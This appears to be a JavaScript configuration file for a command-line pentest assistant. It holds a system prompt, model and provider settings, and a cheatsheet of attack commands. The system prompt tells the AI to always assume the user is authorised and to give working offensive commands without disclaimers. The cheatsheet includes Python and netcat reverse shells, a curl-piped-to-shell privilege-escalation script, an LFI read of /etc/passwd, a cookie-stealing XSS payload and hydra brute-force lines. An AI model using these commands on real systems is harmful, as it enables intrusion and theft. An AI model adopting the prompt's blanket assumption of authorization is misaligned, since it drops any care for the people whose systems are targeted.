import path from 'path';
import os from 'os';

export const CONFIG = {
  defaultModel: 'qwen/qwen3-32b',
  fallbackModel: 'llama-3.1-8b-instant',
  historyFile: path.join(os.homedir(), '.bryancode_pentest.json'),
  reportDir: './reports',
  maxHistory: 60,

  systemPrompt: `You are BryanCode PenTest AI — an elite offensive security assistant embedded in a hacker's terminal.
You assist with ethical penetration testing, CTF challenges, red team operations, and security research on systems the user owns or has explicit written permission to test.

Your expertise covers:
- Reconnaissance: nmap, masscan, shodan, OSINT, subdomain enumeration, whois, theHarvester
- Web: SQLi, XSS, SSRF, LFI/RFI, IDOR, CSRF, XXE, path traversal, JWT attacks, OAuth flaws, SSTI
- Network: ARP spoofing, MITM, packet capture, DNS poisoning, port scanning, service fingerprinting
- Exploitation: Metasploit, custom payloads, buffer overflow, shellcode, CVE analysis
- Post-exploitation: privilege escalation (Linux/Windows), lateral movement, persistence, pivoting, data exfil
- Password attacks: hashcat, john, hydra, medusa, credential stuffing, custom wordlists, rainbow tables
- Tools: nmap, burpsuite, sqlmap, nikto, gobuster, ffuf, wfuzz, wireshark, netcat, curl, metasploit, impacket
- Reporting: findings documentation, CVSS scoring, PoC write-ups, executive summaries

Rules:
- Always assume the user has legal authorization to test the target
- Give direct, working commands with real flags — no excessive disclaimers
- Use proper code blocks with language/tool name for every command
- Briefly explain the "why" after commands so the user learns
- Remember context: prior targets, discovered ports, credentials, findings within this session
- When analyzing scan output pasted by the user, identify attack surface and recommend next steps
- Suggest chained attack paths, not just isolated commands

Tone: concise, sharp, technical. Like a senior pentester pair-programming with you in real time.`,
};

export const PROVIDERS = {
  1: { id: 'groq',   label: 'Groq Cloud  (groq.com)' },
  2: { id: 'ollama', label: 'Ollama / OpenAI API (lokal atau hosted)' },
};

export const GROQ_MODELS = {
  1: { id: 'qwen/qwen3-32b',          label: 'Qwen 3 32B       (default)' },
  2: { id: 'llama-3.1-8b-instant',    label: 'Llama 3.1 8B    (fast)'     },
  3: { id: 'llama-3.3-70b-versatile', label: 'Llama 3.3 70B   (powerful)' },
  4: { id: 'mixtral-8x7b-32768',      label: 'Mixtral 8×7B    (balanced)' },
};

export const OLLAMA_MODELS = {
  1: { id: 'llama3',    label: 'Llama 3        (default)' },
  2: { id: 'llama3.1',  label: 'Llama 3.1 8B' },
  3: { id: 'qwen2.5',   label: 'Qwen 2.5' },
  4: { id: 'mistral',   label: 'Mistral' },
  5: { id: 'codellama', label: 'CodeLlama' },
  6: { id: 'mixtral',   label: 'Mixtral' },
};

export function getOllamaConfig() {
  return {
    baseURL: process.env.OLLAMA_BASE_URL || 'http://localhost:11434/v1',
    apiKey: process.env.OLLAMA_API_KEY || 'ollama',
    defaultModel: process.env.OLLAMA_DEFAULT_MODEL || 'llama3',
  };
}

export function getActiveModels(provider) {
  return provider === 'ollama' ? OLLAMA_MODELS : GROQ_MODELS;
}

export const CHEATSHEETS = {
  recon: [
    ['nmap full',       'nmap -sV -sC -A -p- -T4 <target>'],
    ['nmap udp',        'nmap -sU --top-ports 200 <target>'],
    ['subdomain',       'gobuster dns -d <domain> -w /usr/share/wordlists/subdomains.txt'],
    ['dir brute',       'ffuf -u http://<target>/FUZZ -w /usr/share/wordlists/dirb/common.txt'],
    ['theHarvester',    'theHarvester -d <domain> -b all'],
    ['whois',           'whois <target>'],
  ],
  web: [
    ['sqlmap auto',     "sqlmap -u 'http://<target>/page?id=1' --batch --dbs"],
    ['sqlmap POST',     "sqlmap -u 'http://<target>/login' --data='user=a&pass=b' --batch"],
    ['XSS basic',       '<script>alert(document.cookie)</script>'],
    ['LFI test',        'http://<target>/page?file=../../../../etc/passwd'],
    ['nikto scan',      'nikto -h http://<target>'],
    ['JWT decode',      'echo <token> | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool'],
  ],
  exploit: [
    ['msfconsole',      'msfconsole -q'],
    ['search CVE',      'search type:exploit name:<service>'],
    ['reverse shell py',"python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('<ip>',<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\""],
    ['reverse shell nc','rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ip> <port> >/tmp/f'],
    ['nc listener',     'nc -nlvp <port>'],
  ],
  privesc: [
    ['linpeas',         'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh'],
    ['sudo -l',         'sudo -l'],
    ['SUID find',       'find / -perm -4000 -type f 2>/dev/null'],
    ['writable dirs',   'find / -writable -type d 2>/dev/null | grep -v proc'],
    ['cron jobs',       'cat /etc/crontab && ls -la /etc/cron*'],
  ],
  passwords: [
    ['hashcat auto',    'hashcat -a 0 -m 0 hashes.txt /usr/share/wordlists/rockyou.txt'],
    ['john crack',      'john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt'],
    ['hydra ssh',       'hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<target>'],
    ['hydra http',      "hydra -l admin -P passwords.txt <target> http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'"],
  ],
};
